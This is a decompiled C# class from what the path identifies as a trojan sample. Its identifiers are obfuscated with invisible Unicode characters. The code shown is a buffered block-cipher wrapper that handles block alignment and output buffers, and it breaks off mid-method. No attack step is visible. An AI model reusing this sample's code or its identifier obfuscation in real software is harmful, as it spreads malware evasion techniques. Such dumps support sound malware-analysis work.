// Decompiled with JetBrains decompiler
// Type: ‪‭⁫​⁮‏‬⁬​‏‏‭‫‭‎‌‮⁭‍⁫⁪‮​​⁫‭‌‮‌⁭‏‭‎‍⁫⁫⁫‍‏⁮‮
// Assembly: ReadLineS0SAT, Version=2.0.8.1, Culture=neutral, PublicKeyToken=null
// MVID: 826822DE-6F21-4D67-9238-0DAF50EB618B
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-9ec8f988ff41765b68c6a4d29d259fafb62e97ad2d3633c43fbe0ab0dd12518d.exe

using System;

public class \u202A‭⁫​⁮‏‬⁬​‏‏‭‫‭‎‌‮⁭‍⁫⁪‮​​⁫‭‌‮‌⁭‏‭‎‍⁫⁫⁫‍‏⁮‮ : 
  \u200C⁫‮⁯‍‪‮⁫‬‎⁫‏‭⁫‍⁫‪‭​⁪‫⁪‭⁬⁫⁬‍‍‏‪⁭⁬‎‮‏⁮‎⁬⁭⁪‮
{
  internal byte[] \u202C‮⁬​‪⁯⁬‍‭‏⁯‮‬‭‍‪‫‌‌​‌⁪‬⁯⁮​‮‌‍​⁯​‍‌‭⁯⁮⁭⁬⁭‮;
  internal int \u206D‎​‮‭‭⁭‬​‭⁪‫⁯‏⁬⁪⁪⁪⁮‌⁬⁪‭‏⁫⁭​‪‎‭‫⁮⁮‬‏⁭‎⁮⁮‬‮;
  internal bool \u206F⁬⁪‪‪‫‎⁪‍​‭​⁭⁫‍⁪⁮‮⁫‮⁭⁪‌‫‮​⁯‬‬⁪‭‮​​‌‎‬⁬‮‮‮;
  internal \u206F‮‪⁭⁮‮‏⁭⁮⁫‏‬‫‏‬‍‪‫⁯⁪‏⁫⁯‫⁫‮‪‮‌‌⁭‪‪‌⁮‫‭⁪⁭‪‮ \u200F⁫‭⁫‪⁪‬‮⁪⁬​‌‫‌‭‮⁮⁯​‏‫‪‬⁮⁪‬⁬⁪⁭⁭‌⁮⁯​‬​⁪‍‮⁯‮;

  protected \u202A‭⁫​⁮‏‬⁬​‏‏‭‫‭‎‌‮⁭‍⁫⁪‮​​⁫‭‌‮‌⁭‏‭‎‍⁫⁫⁫‍‏⁮‮()
  {
  }

  public \u202A‭⁫​⁮‏‬⁬​‏‏‭‫‭‎‌‮⁭‍⁫⁪‮​​⁫‭‌‮‌⁭‏‭‎‍⁫⁫⁫‍‏⁮‮(
    \u206F‮‪⁭⁮‮‏⁭⁮⁫‏‬‫‏‬‍‪‫⁯⁪‏⁫⁯‫⁫‮‪‮‌‌⁭‪‪‌⁮‫‭⁪⁭‪‮ _param1)
  {
    this.\u200F⁫‭⁫‪⁪‬‮⁪⁬​‌‫‌‭‮⁮⁯​‏‫‪‬⁮⁪‬⁬⁪⁭⁭‌⁮⁯​‬​⁪‍‮⁯‮ = _param1 != null ? _param1 : throw new ArgumentNullException("cipher");
    this.\u202C‮⁬​‪⁯⁬‍‭‏⁯‮‬‭‍‪‫‌‌​‌⁪‬⁯⁮​‮‌‍​⁯​‍‌‭⁯⁮⁭⁬⁭‮ = new byte[_param1.\u206C⁭‮‍⁯‮⁮⁬‍‭‌⁬⁭‍⁫⁭⁫‌⁪⁮‬⁪⁪‬‏‏⁫‬⁫‏‪⁮‎⁮‮‭⁫‏⁪⁪‮()];
    this.\u206D‎​‮‭‭⁭‬​‭⁪‫⁯‏⁬⁪⁪⁪⁮‌⁬⁪‭‏⁫⁭​‪‎‭‫⁮⁮‬‏⁭‎⁮⁮‬‮ = 0;
  }

  string \u200C⁫‮⁯‍‪‮⁫‬‎⁫‏‭⁫‍⁫‪‭​⁪‫⁪‭⁬⁫⁬‍‍‏‪⁭⁬‎‮‏⁮‎⁬⁭⁪‮.\u206B‪⁭‪⁮‍⁮‪⁭⁪‪​⁮‭‭⁬⁯‍‎⁮⁬‫‍‏‌⁬⁯⁯‮⁪‪‬‫⁯‬⁪‌‍‮‎‮ => this.\u200F⁫‭⁫‪⁪‬‮⁪⁬​‌‫‌‭‮⁮⁯​‏‫‪‬⁮⁪‬⁬⁪⁭⁭‌⁮⁯​‬​⁪‍‮⁯‮.\u206B‪⁭‪⁮‍⁮‪⁭⁪‪​⁮‭‭⁬⁯‍‎⁮⁬‫‍‏‌⁬⁯⁯‮⁪‪‬‫⁯‬⁪‌‍‮‎‮;

  void \u200C⁫‮⁯‍‪‮⁫‬‎⁫‏‭⁫‍⁫‪‭​⁪‫⁪‭⁬⁫⁬‍‍‏‪⁭⁬‎‮‏⁮‎⁬⁭⁪‮.\u206A⁭⁫‪‫‬⁪‎​⁯‎‪⁬⁭​‍⁪⁫‌⁪‫⁯​⁪⁫⁫‪‬⁬‏‫‮⁬‬⁭⁬⁫‍⁮‮(
    bool _param1,
    \u202B⁭⁮‬‎⁪‬⁪‬⁮⁪‮‬‍‎⁮‎⁫‎​‌⁫⁪‭‬‮‏‮​⁮‌‌‬‌⁯‮⁫‮‬⁫‮ _param2)
  {
    this.\u206F⁬⁪‪‪‫‎⁪‍​‭​⁭⁫‍⁪⁮‮⁫‮⁭⁪‌‫‮​⁯‬‬⁪‭‮​​‌‎‬⁬‮‮‮ = _param1;
    if (_param2 is \u206A‍‫‫‪⁮‏‪‫⁫‎⁮‭⁭⁮​‬⁬⁮‫‮‎⁮⁫⁯‫‏⁯⁭⁬⁯⁪‬⁬‫⁪​‫⁪‌‮ obj)
      _param2 = obj.\u202C⁬⁮⁮‮⁮​‫⁪⁬⁬⁬​‎‍⁭⁫‍⁯‬⁪‬⁮⁪‬‬⁭⁭⁫⁫‏‭⁪‬​‮​‫‫⁫‮;
    ((\u200C⁫‮⁯‍‪‮⁫‬‎⁫‏‭⁫‍⁫‪‭​⁪‫⁪‭⁬⁫⁬‍‍‏‪⁭⁬‎‮‏⁮‎⁬⁭⁪‮) this).\u202C‬‎⁪​​‌‎‍⁯⁯​‮‪‮​⁭‬‭​⁮‬‍⁬⁬⁫‭​‎‌⁪⁬‬‮⁬⁫‮⁮‪‪‮();
    this.\u200F⁫‭⁫‪⁪‬‮⁪⁬​‌‫‌‭‮⁮⁯​‏‫‪‬⁮⁪‬⁬⁪⁭⁭‌⁮⁯​‬​⁪‍‮⁯‮.\u206A⁭⁫‪‫‬⁪‎​⁯‎‪⁬⁭​‍⁪⁫‌⁪‫⁯​⁪⁫⁫‪‬⁬‏‫‮⁬‬⁭⁬⁫‍⁮‮(_param1, _param2);
  }

  int \u200C⁫‮⁯‍‪‮⁫‬‎⁫‏‭⁫‍⁫‪‭​⁪‫⁪‭⁬⁫⁬‍‍‏‪⁭⁬‎‮‏⁮‎⁬⁭⁪‮.\u206C⁭‮‍⁯‮⁮⁬‍‭‌⁬⁭‍⁫⁭⁫‌⁪⁮‬⁪⁪‬‏‏⁫‬⁫‏‪⁮‎⁮‮‭⁫‏⁪⁪‮() => this.\u200F⁫‭⁫‪⁪‬‮⁪⁬​‌‫‌‭‮⁮⁯​‏‫‪‬⁮⁪‬⁬⁪⁭⁭‌⁮⁯​‬​⁪‍‮⁯‮.\u206C⁭‮‍⁯‮⁮⁬‍‭‌⁬⁭‍⁫⁭⁫‌⁪⁮‬⁪⁪‬‏‏⁫‬⁫‏‪⁮‎⁮‮‭⁫‏⁪⁪‮();

  int \u200C⁫‮⁯‍‪‮⁫‬‎⁫‏‭⁫‍⁫‪‭​⁪‫⁪‭⁬⁫⁬‍‍‏‪⁭⁬‎‮‏⁮‎⁬⁭⁪‮.\u200F‮⁭⁫‌‎‏​‭‏​⁯‫⁯​‮‫⁪⁫⁬⁮⁭⁯‏​⁫⁯​‮⁫⁮⁮⁫‍⁫‬‪⁮‎‫‮(
    int _param1)
  {
    int num = _param1 + this.\u206D‎​‮‭‭⁭‬​‭⁪‫⁯‏⁬⁪⁪⁪⁮‌⁬⁪‭‏⁫⁭​‪‎‭‫⁮⁮‬‏⁭‎⁮⁮‬‮;
    return num - num % this.\u202C‮⁬​‪⁯⁬‍‭‏⁯‮‬‭‍‪‫‌‌​‌⁪‬⁯⁮​‮‌‍​⁯​‍‌‭⁯⁮⁭⁬⁭‮.Length;
  }

  int \u200C⁫‮⁯‍‪‮⁫‬‎⁫‏‭⁫‍⁫‪‭​⁪‫⁪‭⁬⁫⁬‍‍‏‪⁭⁬‎‮‏⁮‎⁬⁭⁪‮.\u200E‍‮‎‎‎​‫⁫‍‮‭‫⁬⁭⁪​‮⁭‫⁫‌⁫⁯‮‪⁪‭⁭‬‎​⁪‎‪‫⁯‭‌⁫‮(
    int _param1)
  {
    return _param1 + this.\u206D‎​‮‭‭⁭‬​‭⁪‫⁯‏⁬⁪⁪⁪⁮‌⁬⁪‭‏⁫⁭​‪‎‭‫⁮⁮‬‏⁭‎⁮⁮‬‮;
  }

  int \u200C⁫‮⁯‍‪‮⁫‬‎⁫‏‭⁫‍⁫‪‭​⁪‫⁪‭⁬⁫⁬‍‍‏‪⁭⁬‎‮‏⁮‎⁬⁭⁪‮.\u200E⁯‬‎⁯⁭⁭‬⁬⁫‍‌‫‫⁮‭‫‍⁫⁯⁫⁫‫‭‭‌​‫‏‬⁫‏‪⁪‬⁫‎‍‫⁮‮(
    byte _param1,
    byte[] _param2,
    int _param3)
  {
    this.\u202C‮⁬​‪⁯⁬‍‭‏⁯‮‬‭‍‪‫‌‌​‌⁪‬⁯⁮​‮‌‍​⁯​‍‌‭⁯⁮⁭⁬⁭‮[this.\u206D‎​‮‭‭⁭‬​‭⁪‫⁯‏⁬⁪⁪⁪⁮‌⁬⁪‭‏⁫⁭​‪‎‭‫⁮⁮‬‏⁭‎⁮⁮‬‮++] = _param1;
    if (this.\u206D‎​‮‭‭⁭‬​‭⁪‫⁯‏⁬⁪⁪⁪⁮‌⁬⁪‭‏⁫⁭​‪‎‭‫⁮⁮‬‏⁭‎⁮⁮‬‮ != this.\u202C‮⁬​‪⁯⁬‍‭‏⁯‮‬‭‍‪‫‌‌​‌⁪‬⁯⁮​‮‌‍​⁯​‍‌‭⁯⁮⁭⁬⁭‮.Length)
      return 0;
    if (_param3 + this.\u202C‮⁬​‪⁯⁬‍‭‏⁯‮‬‭‍‪‫‌‌​‌⁪‬⁯⁮​‮‌‍​⁯​‍‌‭⁯⁮⁭⁬⁭‮.Length > _param2.Length)
      throw new \u202A⁯⁬⁬‪⁫‌‏‎‬⁮‬⁪⁬‬⁯‍‍‍‌‎‍‍‬‍‮‬⁫​⁬‎⁯‪‏‏‫‍‫‌‫‮("output buffer too short");
    this.\u206D‎​‮‭‭⁭‬​‭⁪‫⁯‏⁬⁪⁪⁪⁮‌⁬⁪‭‏⁫⁭​‪‎‭‫⁮⁮‬‏⁭‎⁮⁮‬‮ = 0;
    return this.\u200F⁫‭⁫‪⁪‬‮⁪⁬​‌‫‌‭‮⁮⁯​‏‫‪‬⁮⁪‬⁬⁪⁭⁭‌⁮⁯​‬​⁪‍‮⁯‮.\u206D‌‍‪⁮⁮⁮⁯‭⁪‍‬‭‏‍⁬⁭⁯‪‏‍‭‬‮‬⁮​⁫⁭⁯‭‫‌​‫‍⁭‬⁯‍‮(this.\u202C‮⁬​‪⁯⁬‍‭‏⁯‮‬‭‍‪‫‌‌​‌⁪‬⁯⁮​‮‌‍​⁯​‍‌‭⁯⁮⁭⁬⁭‮, 0, _param2, _param3);
  }

  byte[] \u200C⁫‮⁯‍‪‮⁫‬‎⁫‏‭⁫‍⁫‪‭​⁪‫⁪‭⁬⁫⁬‍‍‏‪⁭⁬‎‮‏⁮‎⁬⁭⁪‮.\u200E⁯‬‎⁯⁭⁭‬⁬⁫‍‌‫‫⁮‭‫‍⁫⁯⁫⁫‫‭‭‌​‫‏‬⁫‏‪⁪‬⁫‎‍‫⁮‮(
    byte _param1)
  {
    int length1 = ((\u200C⁫‮⁯‍‪‮⁫‬‎⁫‏‭⁫‍⁫‪‭​⁪‫⁪‭⁬⁫⁬‍‍‏‪⁭⁬‎‮‏⁮‎⁬⁭⁪‮) this).\u200F‮⁭⁫‌‎‏​‭‏​⁯‫⁯​‮‫⁪⁫⁬⁮⁭⁯‏​⁫⁯​‮⁫⁮⁮⁫‍⁫‬‪⁮‎‫‮(1);
    byte[] sourceArray = length1 > 0 ? new byte[length1] : (byte[]) null;
    int length2 = ((\u200C⁫‮⁯‍‪‮⁫‬‎⁫‏‭⁫‍⁫‪‭​⁪‫⁪‭⁬⁫⁬‍‍‏‪⁭⁬‎‮‏⁮‎⁬⁭⁪‮) this).\u200E⁯‬‎⁯⁭⁭‬⁬⁫‍‌‫‫⁮‭‫‍⁫⁯⁫⁫‫‭‭‌​‫‏‬⁫‏‪⁪‬⁫‎‍‫⁮‮(_param1, sourceArray, 0);
    if (length1 > 0 && length2 < length1)
    {
      byte[] destinationArray = new byte[length2];
      Array.Copy((Array) sourceArray, 0, (Array) destinationArray, 0, length2);
      sourceArray = destinationArray;
    }
    return sourceArray;
  }

  byte[] \u200C⁫‮⁯‍‪‮⁫‬‎⁫‏‭⁫‍⁫‪‭​⁪‫⁪‭⁬⁫⁬‍‍‏‪⁭⁬‎‮‏⁮‎⁬⁭⁪‮.\u206D‫⁭‪‭‏‎‌⁪⁪⁯‪​‌⁯‪‮⁮⁭‎⁪​⁯⁮‪‬‮⁪‭‬‍‫⁪⁭‍⁪‏⁪⁬‪‮(
    byte[] _param1,
    int _param2,
    int _param3)
  {
    if (_param1 == null)
      throw new ArgumentNullException("input");
    if (_param3 < 1)
      return (byte[]) null;
    int length1 = ((\u200C⁫‮⁯‍‪‮⁫‬‎⁫‏‭⁫‍⁫‪‭​⁪‫⁪‭⁬⁫⁬‍‍‏‪⁭⁬‎‮‏⁮‎⁬⁭⁪‮) this).\u200F‮⁭⁫‌‎‏​‭‏​⁯‫⁯​‮‫⁪⁫⁬⁮⁭⁯‏​⁫⁯​‮⁫⁮⁮⁫‍⁫‬‪⁮‎‫‮(_param3);
    byte[] sourceArray = length1 > 0 ? new byte[length1] : (byte[]) null;
    int length2 = ((\u200C⁫‮⁯‍‪‮⁫‬‎⁫‏‭⁫‍⁫‪‭​⁪‫⁪‭⁬⁫⁬‍‍‏‪⁭⁬‎‮‏⁮‎⁬⁭⁪‮) this).\u206D‫⁭‪‭‏‎‌⁪⁪⁯‪​‌⁯‪‮⁮⁭‎⁪​⁯⁮‪‬‮⁪‭‬‍‫⁪⁭‍⁪‏⁪⁬‪‮(_param1, _param2, _param3, sourceArray, 0);
    if (length1 > 0 && length2 < length1)
    {
      byte[] destinationArray = new byte[length2];
      Array.Copy((Array) sourceArray, 0, (Array) destinationArray, 0, length2);
      sourceArray = destinationArray;
    }
    return sourceArray;
  }

  int \u200C⁫‮⁯‍‪‮⁫‬‎⁫‏‭⁫‍⁫‪‭​⁪‫⁪‭⁬⁫⁬‍‍‏‪⁭⁬‎‮‏⁮‎⁬⁭⁪‮.\u206D‫⁭‪‭‏‎‌⁪⁪⁯‪​‌⁯‪‮⁮⁭‎⁪​⁯⁮‪‬‮⁪‭‬‍‫⁪⁭‍⁪‏⁪⁬‪‮(
    byte[] _param1,
    int _param2,
    int _param3,
    byte[] _param4,
    int _param5)
  {
    if (_param3 < 1)
    {
      if (_param3 < 0)
        throw new ArgumentException("Can't have a negative input length!");
      return 0;
    }
    int num1 = ((\u200C⁫‮⁯‍‪‮⁫‬‎⁫‏‭⁫‍⁫‪‭​⁪‫⁪‭⁬⁫⁬‍‍‏‪⁭⁬‎‮‏⁮‎⁬⁭⁪‮) this).\u206C⁭‮‍⁯‮⁮⁬‍‭‌⁬⁭‍⁫⁭⁫‌⁪⁮‬⁪⁪‬‏‏⁫‬⁫‏‪⁮‎⁮‮‭⁫‏⁪⁪‮();
    int num2 = ((\u200C⁫‮⁯‍‪‮⁫‬‎⁫‏‭⁫‍⁫‪‭​⁪‫⁪‭⁬⁫⁬‍‍‏‪⁭⁬‎‮‏⁮‎⁬⁭⁪‮) this).\u200F‮⁭⁫‌‎‏​‭‏​⁯‫⁯​‮‫⁪⁫⁬⁮⁭⁯‏​⁫⁯​‮⁫⁮⁮⁫‍⁫‬‪⁮‎‫‮(_param3);
    if (num2 > 0)
      \u200B‪⁭⁮⁫⁯‌‭‏‫⁭⁯⁯‫‪‎‬‍⁪‬⁮⁪‮‍‮‎‬⁬‎⁪⁬⁫‌‍⁬‮‏‫‭⁬‮.\u200D‬⁫‬‬⁯⁭‭⁪‮‪‬⁬⁫⁮‎‪‌⁭‎⁫⁯‍⁭⁮⁪‭​⁫⁫‭‏‍⁮‏‬​⁪⁯‎‮(_param4, _param5, num2, "output buffer too short");
    int num3 = 0;
    int length = this.\u202C‮⁬​‪⁯⁬‍‭‏⁯‮‬‭‍‪‫‌‌​‌⁪‬⁯⁮​‮‌‍​⁯​‍‌‭⁯⁮⁭⁬⁭‮.Length - this.\u206D‎​‮‭‭⁭‬​‭⁪‫⁯‏⁬⁪⁪⁪⁮‌⁬⁪‭‏⁫⁭​‪‎‭‫⁮⁮‬‏⁭‎⁮⁮‬‮;
    if (_param3 > length)
    {
      Array.Copy((Array) _param1, _param2, (Array) this.\u202C‮⁬​‪⁯⁬‍‭‏⁯‮‬‭‍‪‫‌‌​‌⁪‬⁯⁮​‮‌‍​⁯​‍‌‭⁯⁮⁭⁬⁭‮, this.\u206D‎​‮‭‭⁭‬​‭⁪‫⁯‏⁬⁪⁪⁪⁮‌⁬⁪‭‏⁫⁭​‪‎‭‫⁮⁮‬‏⁭‎⁮⁮‬‮, length);
      num3 += this.\u200F⁫‭⁫‪⁪‬‮⁪⁬​‌‫‌‭‮⁮⁯​‏‫‪‬⁮⁪‬⁬⁪⁭⁭‌⁮⁯​‬​⁪‍‮⁯‮.\u206D‌‍‪⁮⁮⁮⁯‭⁪‍‬‭‏‍⁬⁭⁯‪‏‍‭‬‮‬⁮​⁫⁭⁯‭‫‌​‫‍⁭‬⁯‍‮(this.\u202C‮⁬​‪⁯⁬‍‭‏⁯‮‬‭‍‪‫‌‌​‌⁪‬⁯⁮​‮‌‍​⁯​‍‌‭⁯⁮⁭⁬⁭‮, 0, _param4, _param5);
      this.\u206D‎​‮‭‭⁭‬​‭⁪‫⁯‏⁬⁪⁪⁪⁮‌⁬⁪‭‏⁫⁭​‪‎‭‫⁮⁮‬‏⁭‎⁮⁮‬‮ = 0;
      _param3 -= length;
      _param2 += length;
      while (_param3 > this.\u202C‮⁬​‪⁯⁬‍‭‏⁯‮‬‭‍‪‫‌‌​‌⁪‬⁯⁮​‮‌‍​⁯​‍‌‭⁯⁮⁭⁬⁭‮.Length)
      {
        num3 += this.\u200F⁫‭⁫‪⁪‬‮⁪⁬​‌‫‌‭‮⁮⁯​‏‫‪‬⁮⁪‬⁬⁪⁭⁭‌⁮⁯​‬​⁪‍‮⁯‮.\u206D‌‍‪⁮⁮⁮⁯‭⁪‍‬‭‏‍⁬⁭⁯‪‏‍‭‬‮‬⁮​⁫⁭⁯‭‫‌​‫‍⁭‬⁯‍‮(_param1, _param2, _param4, _param5 + num3);
        _param3 -= num1;
        _param2 += num1;
      }
    }
    Array.Copy((Array) _param1, _param2, (Array) this.\u202C‮⁬​‪⁯⁬‍‭‏⁯‮‬‭‍‪‫‌‌​‌⁪‬⁯⁮​‮‌‍​⁯​‍‌‭⁯⁮⁭⁬⁭‮, this.\u206D‎​‮‭‭⁭‬​‭⁪‫⁯‏⁬⁪⁪⁪⁮‌⁬⁪‭‏⁫⁭​‪‎‭‫⁮⁮‬‏⁭‎⁮⁮‬‮, _param3);
    this.\u206D‎​‮‭‭⁭‬​‭⁪‫⁯‏⁬⁪⁪⁪⁮‌⁬⁪‭‏⁫⁭​‪‎‭‫⁮⁮‬‏⁭‎⁮⁮‬‮ += _param3;
    if (this.\u206D‎​‮‭‭⁭‬​‭⁪‫⁯‏⁬⁪⁪⁪⁮‌⁬⁪‭‏⁫⁭​‪‎‭‫⁮⁮‬‏⁭‎⁮⁮‬‮ == this.\u202C‮⁬​‪⁯⁬‍‭‏⁯‮‬‭‍‪‫‌‌​‌⁪‬⁯⁮​‮‌‍​⁯​‍‌‭⁯⁮⁭⁬⁭‮.Length)
    {
      num3 += this.\u200F⁫‭⁫‪⁪‬‮⁪⁬​‌‫‌‭‮⁮⁯​‏‫‪‬⁮⁪‬⁬⁪⁭⁭‌⁮⁯​‬​⁪‍‮⁯‮.\u206D‌‍‪⁮⁮⁮⁯‭⁪‍‬‭‏‍⁬⁭⁯‪‏‍‭‬‮‬⁮​⁫⁭⁯‭‫‌​‫‍⁭‬⁯‍‮(this.\u202C‮⁬​‪⁯⁬‍‭‏⁯‮‬‭‍‪‫‌‌​‌⁪‬⁯⁮​‮‌‍​⁯​‍‌‭⁯⁮⁭⁬⁭‮, 0, _param4, _param5 + num3);
      this.\u206D‎​‮‭‭⁭‬​‭⁪‫⁯‏⁬⁪⁪⁪⁮‌⁬⁪‭‏⁫⁭​‪‎‭‫⁮⁮‬‏⁭‎⁮⁮‬‮ = 0;
    }
    return num3;
  }

  byte[] \u200C⁫‮⁯‍‪‮⁫‬‎⁫‏‭⁫‍⁫‪‭​⁪‫⁪‭⁬⁫⁬‍‍‏‪⁭⁬‎‮‏⁮‎⁬⁭⁪‮.\u200F‏‏‬‫​⁮‬⁫‌‌⁮⁬‏⁭‭‌⁯⁪​‍​⁮⁫‮‫⁮‌‎‪⁬⁯⁪‪⁬‫⁫⁮‪⁭‮()
  {
    byte[] sourceArray = \u200C⁫‮⁯‍‪‮⁫‬‎⁫‏‭⁫‍⁫‪‭​⁪‫⁪‭⁬⁫⁬‍‍‏‪⁭⁬‎‮‏⁮‎⁬⁭⁪‮.\u202C⁮‭​⁮​‮‮⁯⁭‬⁬‏‎‍​‏⁮⁫‏‮‪‏⁫‬‬​⁬‫⁮⁫⁬⁬⁫⁪⁯‎‏⁬⁮‮;
    int length1 = ((\u200C⁫‮⁯‍‪‮⁫‬‎⁫‏‭⁫‍⁫‪‭​⁪‫⁪‭⁬⁫⁬‍‍‏‪⁭⁬‎‮‏⁮‎⁬⁭⁪‮) this).\u200E‍‮‎‎‎​‫⁫‍‮‭‫⁬⁭⁪​‮⁭‫⁫‌⁫⁯‮‪⁪‭⁭‬‎​⁪‎‪‫⁯‭‌⁫‮(0);
    if (length1 > 0)
    {
      sourceArray = new byte[length1];
      int length2 = ((\u200C⁫‮⁯‍‪‮⁫‬‎⁫‏‭⁫‍⁫‪‭​⁪‫⁪‭⁬⁫⁬‍‍‏‪⁭⁬‎‮‏⁮‎⁬⁭⁪‮) this).\u200F‏‏‬‫​⁮‬⁫‌‌⁮⁬‏⁭‭‌⁯⁪​‍​⁮⁫‮‫⁮‌‎‪⁬⁯⁪‪⁬‫⁫⁮‪⁭‮(sourceArray, 0);
      if (length2 < sourceArray.Length)
      {
        byte[] destinationArray = new byte[length2];
        Array.Copy((Array) sourceArray, 0, (Array) destinationArray, 0, length2);
        sourceArray = destinationArray;
      }
    }
    else
      ((\u200C⁫‮⁯‍‪‮⁫‬‎⁫‏‭⁫‍⁫‪‭​⁪‫⁪‭⁬⁫⁬‍‍‏‪⁭⁬‎‮‏⁮‎⁬⁭⁪‮) this).\u202C‬‎⁪​​‌‎‍⁯⁯​‮‪‮​⁭‬‭​⁮‬‍⁬⁬⁫‭​‎‌⁪⁬‬‮⁬⁫‮⁮‪‪‮();
    return sourceArray;
  }

  byte[] \u200C⁫‮⁯‍‪‮⁫‬‎⁫‏‭⁫‍⁫‪‭​⁪‫⁪‭⁬⁫⁬‍‍‏‪⁭⁬‎‮‏⁮‎⁬⁭⁪‮.\u200F‏‏‬‫​⁮‬⁫‌‌⁮⁬‏⁭‭‌⁯⁪​‍​⁮⁫‮‫⁮‌‎‪⁬⁯⁪‪⁬‫⁫⁮‪⁭‮(
    byte[] _param1,
    int _param2,
    int _param3)
  {
    if (_param1 == null)
      throw new ArgumentNullException("input");
    int length1 = ((\u200C⁫‮⁯‍‪‮⁫‬‎⁫‏‭⁫‍⁫‪‭​⁪‫⁪‭⁬⁫⁬‍‍‏‪⁭⁬‎‮‏⁮‎⁬⁭⁪‮) this).\u200E‍‮‎‎‎​‫⁫‍‮‭‫⁬⁭⁪​‮⁭‫⁫‌⁫⁯‮‪⁪‭⁭‬‎​⁪‎‪‫⁯‭‌⁫‮(_param3);
    byte[] sourceArray = \u200C⁫‮⁯‍‪‮⁫‬‎⁫‏‭⁫‍⁫‪‭​⁪‫⁪‭⁬⁫⁬‍‍‏‪⁭⁬‎‮‏⁮‎⁬⁭⁪‮.\u202C⁮‭​⁮​‮‮⁯⁭‬⁬‏‎‍​‏⁮⁫‏‮‪‏⁫‬‬​⁬‫⁮⁫⁬⁬⁫⁪⁯‎‏⁬⁮‮;
    if (length1 > 0)
    {
      sourceArray = new byte[length1];
      int num = _param3 > 0 ? ((\u200C⁫‮⁯‍‪‮⁫‬‎⁫‏‭⁫‍⁫‪‭​⁪‫⁪‭⁬⁫⁬‍‍‏‪⁭⁬‎‮‏⁮‎⁬⁭⁪‮) this).\u206D‫⁭‪‭‏‎‌⁪⁪⁯‪​‌⁯‪‮⁮⁭‎⁪​⁯⁮‪‬‮⁪‭‬‍‫⁪⁭‍⁪‏⁪⁬‪‮(_param1, _param2, _param3, sourceArray, 0) : 0;
      int length2 = num + ((\u200C⁫‮⁯‍‪‮⁫‬‎⁫‏‭⁫‍⁫‪‭​⁪‫⁪‭⁬⁫⁬‍‍‏‪⁭⁬‎‮‏⁮‎⁬⁭⁪‮) this).\u200F‏‏‬‫​⁮‬⁫‌‌⁮⁬‏⁭‭‌⁯⁪​‍​⁮⁫‮‫⁮‌‎‪⁬⁯⁪‪⁬‫⁫⁮‪⁭‮(sourceArray, num);
      if (length2 < sourceArray.Length)
      {
        byte[] destinationArray = new byte[length2];
        Array.Copy((Array) sourceArray, 0, (Array) destinationArray, 0, length2);
        sourceArray = destinationArray;
      }
    }
    else
      ((\u200C⁫‮⁯‍‪‮⁫‬‎⁫‏‭⁫‍⁫‪‭​⁪‫⁪‭⁬⁫⁬‍‍‏‪⁭⁬‎‮‏⁮‎⁬⁭⁪‮) this).\u202C‬‎⁪​​‌‎‍⁯⁯​‮‪‮​⁭‬‭​⁮‬‍⁬⁬⁫‭​‎‌⁪⁬‬‮⁬⁫‮⁮‪‪‮();
    return sourceArray;
  }

  int \u200C⁫‮⁯‍‪‮⁫‬‎⁫‏‭⁫‍⁫‪‭​⁪‫⁪‭⁬⁫⁬‍‍‏‪⁭⁬‎‮‏⁮‎⁬⁭⁪‮.\u200F‏‏‬‫​⁮‬⁫‌‌⁮⁬‏⁭‭‌⁯⁪​‍​⁮⁫‮‫⁮‌‎‪⁬⁯⁪‪⁬‫⁫⁮‪⁭‮(
    byte[] _param1,
    int _param2)
  {
    try
    {
      if (this.\u206D‎​‮‭‭⁭‬​‭⁪‫⁯‏⁬⁪⁪⁪⁮‌⁬⁪‭‏⁫⁭​‪‎‭‫⁮⁮‬‏⁭‎⁮⁮‬‮ != 0)
      {
        \u200B‪⁭⁮⁫⁯‌‭‏‫⁭⁯⁯‫‪‎‬‍⁪‬⁮⁪‮‍‮‎‬⁬‎⁪⁬⁫‌‍⁬‮‏‫‭⁬‮.\u200D‮⁭⁫‎⁮‏⁬⁫‍‬​‬‪‫‬‭‭‭⁬⁪‎‭⁮⁭‬‭⁭⁬⁬‪‍‌‎‏‬⁪‫‫‌‮(!this.\u200F⁫‭⁫‪⁪‬‮⁪⁬​‌‫‌‭‮⁮⁯​‏‫‪‬⁮⁪‬⁬⁪⁭⁭‌⁮⁯​‬​⁪‍‮⁯‮.\u200F‍‌⁭‬⁯‪‌‍‮‬‏​⁭‪‬‌​‬‍‭‮‬​⁭‬‎‬‌‪‬⁪‏​‎‎​‮⁬‎‮, "data not block size aligned");
        \u200B‪⁭⁮⁫⁯‌‭‏‫⁭⁯⁯‫‪‎‬‍⁪‬⁮⁪‮‍‮‎‬⁬‎⁪⁬⁫‌‍⁬‮‏‫‭⁬‮.\u200D‬⁫‬‬⁯⁭‭⁪‮‪‬⁬⁫⁮‎‪‌⁭‎⁫⁯‍⁭⁮⁪‭​⁫⁫‭‏‍⁮‏‬​⁪⁯‎‮(_param1, _param2, this.\u206D‎​‮‭‭⁭‬​‭⁪‫⁯‏⁬⁪⁪⁪⁮‌⁬⁪‭‏⁫⁭​‪‎‭‫⁮⁮‬‏⁭‎⁮⁮‬‮, "output buffer too short for DoFinal()");
        this.\u200F⁫‭⁫‪⁪‬‮⁪⁬​‌‫‌‭‮⁮⁯​‏‫‪‬⁮⁪‬⁬⁪⁭⁭‌⁮⁯​‬​⁪‍‮⁯‮.\u206D‌‍‪⁮⁮⁮⁯‭⁪‍‬‭‏‍⁬⁭⁯‪‏‍‭‬‮‬⁮​⁫⁭⁯‭‫‌​‫‍⁭‬⁯‍‮(this.\u202C‮⁬​‪⁯⁬‍‭‏⁯‮‬‭‍‪‫‌‌​‌⁪‬⁯⁮​‮‌‍​⁯​‍‌‭⁯⁮⁭⁬⁭‮, 0, this.\u202C‮⁬​‪⁯⁬‍‭‏⁯‮‬‭‍‪‫‌‌​‌⁪‬⁯⁮​‮‌‍​⁯​‍‌‭⁯⁮⁭⁬⁭‮, 0);
        Array.Copy((Array) this.\u202C‮⁬​‪⁯⁬‍‭‏⁯‮‬‭‍‪‫‌‌​‌⁪‬⁯⁮​‮‌‍​⁯​‍‌‭⁯⁮⁭⁬⁭‮, 0, (Array) _param1, _param2, this.\u206D‎​‮‭‭⁭‬​‭⁪‫⁯‏⁬⁪⁪⁪⁮‌⁬⁪‭‏⁫⁭​‪‎‭‫⁮⁮‬‏⁭‎⁮⁮‬‮);
      }
      return this.\u206D‎​‮‭‭⁭‬​‭⁪‫⁯‏⁬⁪⁪⁪⁮‌⁬⁪‭‏⁫⁭​‪‎‭‫⁮⁮‬‏⁭‎⁮⁮‬‮;
